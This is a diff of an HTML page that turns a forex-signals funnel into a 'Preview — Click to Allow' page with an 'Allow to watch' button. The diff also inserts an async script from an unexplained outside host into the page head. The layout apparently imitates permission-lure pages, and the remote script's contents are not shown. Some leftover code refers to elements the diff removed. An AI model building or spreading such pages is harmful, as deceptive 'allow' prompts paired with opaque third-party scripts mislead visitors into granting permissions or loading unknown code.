@@ -1,34 +1,57 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Forex Funnel</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <script async src="https://ss.mrmnd.com/ctatic/f6039d1a-9731-4e14-8839-b23cfa4108d9.js"></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Preview — Click to Allow</title>
+  <style>
+    :root{--bg:#0f1724;--card:#0b1220;--accent:#06b6d4}
+    html,body{height:100%;margin:0;font-family:Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial}
+    body{display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,#071023 0%, #081226 100%);color:#e6eef6}
+    .card{width:min(680px,94vw);background:rgba(255,255,255,0.03);border-radius:12px;padding:28px;box-shadow:0 10px 30px rgba(2,6,23,0.6);text-align:center}
+    .preview-wrap{display:flex;flex-direction:column;gap:18px;align-items:center}
+    img{max-width:100%;height:auto;border-radius:8px;box-shadow:0 6px 20px rgba(2,6,23,0.5)}
+    .btn{appearance:none;border:0;padding:12px 18px;border-radius:10px;font-weight:600;cursor:pointer;background:linear-gradient(90deg,var(--accent),#0ea5a4);color:#022;box-shadow:0 6px 18px rgba(3,7,18,0.6)}
+    .hint{font-size:13px;opacity:0.8}
+    @media (max-width:420px){.card{padding:18px}}
+  </style>
 </head>
-<body class="bg-gradient-to-r from-green-200 via-green-100 to-green-200 min-h-screen flex items-center justify-center">
-  <div class="w-full max-w-xl bg-white rounded-2xl shadow-xl p-8 text-center space-y-6">
-    <!-- Header -->
-    <h1 class="text-3xl font-bold text-green-700">💸 Want to Make Money Trading Forex? 💸</h1>
-    <p class="text-gray-600 text-lg">Choose the option that best fits you 👇</p>
+<body>
+  <main class="card" role="main" aria-labelledby="title">
+    <h1 id="title" style="margin:0 0 8px;font-size:20px">Preview</h1>
 
-    <!-- Step 1 Buttons -->
-    <div id="step1" class="space-y-4">
-      <button onclick="showStep2()" class="w-full bg-green-600 text-white py-3 rounded-xl text-lg font-semibold shadow-md hover:bg-green-700 transition">Yes! Show Me How 🤑</button>
+    <div class="preview-wrap">
+      <!-- Place preview.PNG in the same folder as this HTML file -->
+      <img src="preview.PNG" alt="Preview image" id="previewImage">
+
+      <button class="btn" id="allowBtn" aria-label="Allow to watch">Allow to watch</button>
+      <p class="hint">Click the button to allow playback. This demo shows an alert for demo purposes.</p>
     </div>
+  </main>
 
-    <!-- Step 2 -->
-    <div id="step2" class="hidden space-y-6">
-      <h2 class="text-2xl font-semibold text-gray-800">Do you already know how to trade? 📈</h2>
+  <script>
+    const btn = document.getElementById('allowBtn');
+    const img = document.getElementById('previewImage');
 
-      <div class="space-y-4">
-        <a href="https://t.me/drparadoxfx" target="_blank" class="block bg-blue-600 text-white py-3 rounded-xl text-lg font-semibold shadow-md hover:bg-blue-700 transition">I just want Forex Signals 🔥</a>
-        <a href="https://t.me/bigtinn" target="_blank" class="block bg-yellow-500 text-white py-3 rounded-xl text-lg font-semibold shadow-md hover:bg-yellow-600 transition">I want to Learn Trading 🎓</a>
-      </div>
-    </div>
+    function showAlertAndPlay(){
+      // This simulates "allowing" playback — replace with real logic (e.g., start video) if needed
+      alert('Allowed — now playing!');
+    }
 
-  </div>
+    // Click handlers for both the button and the image
+    btn.addEventListener('click', showAlertAndPlay);
+    img.addEventListener('click', showAlertAndPlay);
 
+    // Accessibility: allow Enter/Space on focused button
+    btn.addEventListener('keyup', (e) => {
+      if(e.key === 'Enter' || e.key === ' '){
+        showAlertAndPlay();
+      }
+    });
+  </script>
+
+    
   <script>
     function showStep2() {
       document.getElementById('step1').classList.add('hidden');
@@ -46,3 +69,5 @@
 </script>
 </body>
 </html>
+
+
